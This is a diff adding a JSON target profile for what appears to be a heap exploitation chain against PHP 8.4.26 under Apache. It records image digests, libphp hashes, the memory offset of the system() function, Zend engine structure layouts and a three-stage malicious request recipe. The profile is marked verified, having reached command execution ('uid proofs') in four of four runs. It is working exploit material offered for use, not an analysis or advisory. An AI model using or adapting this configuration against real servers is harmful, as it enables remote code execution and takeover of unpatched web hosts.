@@ -1,0 +1,143 @@
+{
+  "schema_version": 1,
+  "id": "php-8.4.26-apache-amd64-fixed-carrier",
+  "verification": {
+    "state": "verified",
+    "runs": 4,
+    "proof": "uid-only-local-differential-lab-4-of-4",
+    "verified_at": "2026-10-23T00:00:00Z"
+  },
+  "build": {
+    "image": {
+      "repo_digest": "php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a",
+      "image_id": "sha256:46b195b6378e712d1a65cd3f853242bebd7f3cb4cafe137fd592b365909d2c17",
+      "platform": "linux/amd64"
+    },
+    "php": {
+      "version": "8.4.26",
+      "sapi": "apache2handler",
+      "zts": false,
+      "debug": false
+    },
+    "libphp": {
+      "path": "/usr/lib/apache2/modules/libphp.so",
+      "sha256": "51663cf883b1223436d4c99f31dd0225735ea5573665e4242621eee7f4ee679c",
+      "gnu_build_id": "a534a5c4a890b378ef6c227590627d531eafa8ce",
+      "elf_class": 64,
+      "endianness": "little",
+      "machine": "EM_X86_64",
+      "type": "ET_DYN"
+    }
+  },
+  "symbols": {
+    "zif_system": {
+      "name": "zif_system",
+      "offset": "0x465370"
+    },
+    "zval_ptr_dtor": {
+      "name": "zval_ptr_dtor",
+      "offset": "0x65eb60"
+    }
+  },
+  "abi": {
+    "pointer_size": 8,
+    "page_size": "0x1000",
+    "zend_mm_chunk_size": "0x200000",
+    "zend_string": {
+      "size_before_val": "0x18",
+      "len": "0x10",
+      "val": "0x18"
+    },
+    "zval": {
+      "size": "0x10",
+      "value": "0x0",
+      "type_info": "0x8"
+    },
+    "zend_reference": {
+      "size": "0x20",
+      "gc": "0x0",
+      "val": "0x8",
+      "sources": "0x18"
+    },
+    "zend_array": {
+      "size": "0x38",
+      "gc": "0x0",
+      "flags": "0x8",
+      "table_mask": "0xc",
+      "ar_data": "0x10",
+      "num_used": "0x18",
+      "num_elements": "0x1c",
+      "table_size": "0x20",
+      "internal_pointer": "0x24",
+      "next_free": "0x28",
+      "destructor": "0x30"
+    },
+    "zend_execute_data": {
+      "size": "0x50",
+      "opline": "0x0",
+      "call": "0x8",
+      "return_value": "0x10",
+      "func": "0x18",
+      "this": "0x20",
+      "num_args": "0x2c",
+      "prev": "0x30",
+      "symbol_table": "0x38",
+      "call_info": "0x40",
+      "arg1": "0x50"
+    },
+    "types": {
+      "is_string": "0x6",
+      "is_array": "0x7",
+      "is_reference": "0xa",
+      "gc_string": "0x106",
+      "array_ex": "0x307"
+    }
+  },
+  "runtime": {
+    "mpm": "prefork",
+    "workers": 1,
+    "memory_limit": "8M",
+    "post_max_size": "64M",
+    "upload_max_filesize": "64M",
+    "max_input_vars": 1000,
+    "display_errors": true,
+    "file_uploads": true,
+    "session_extension": true,
+    "upload_progress_enabled": true,
+    "session_name": "PHPSESSID",
+    "upload_progress_name": "PHP_SESSION_UPLOAD_PROGRESS"
+  },
+  "request_recipe": {
+    "huge_mb": 12,
+    "rotate_fillers": 1001,
+    "stage1": {
+      "fillers": 841,
+      "allow_cookie_self_calibration": true
+    },
+    "stage2": {
+      "strategy": "fixed-array-v1",
+      "fillers": 983,
+      "target": 406,
+      "target_count": 16,
+      "value_len": 16
+    },
+    "stage3": {
+      "strategy": "fixed-carrier-v1",
+      "htdata_offset": "0x690d8",
+      "pads": [
+        {
+          "name_len": 31,
+          "value_len": 31,
+          "repeat": 6
+        }
+      ],
+      "prime_fields": 2,
+      "prime_value_len": 15,
+      "carrier_copies": 15
+    }
+  },
+  "provenance": {
+    "source": "local-differential-docker-lab",
+    "notes": "Exact official php:8.4.26-apache linux/amd64 image and the 8M/single-prefork runtime; fixed-carrier chain produced uid proofs in 4/4 documented runs and PHP 8.4.27 failed before stage 3."
+  }
+}
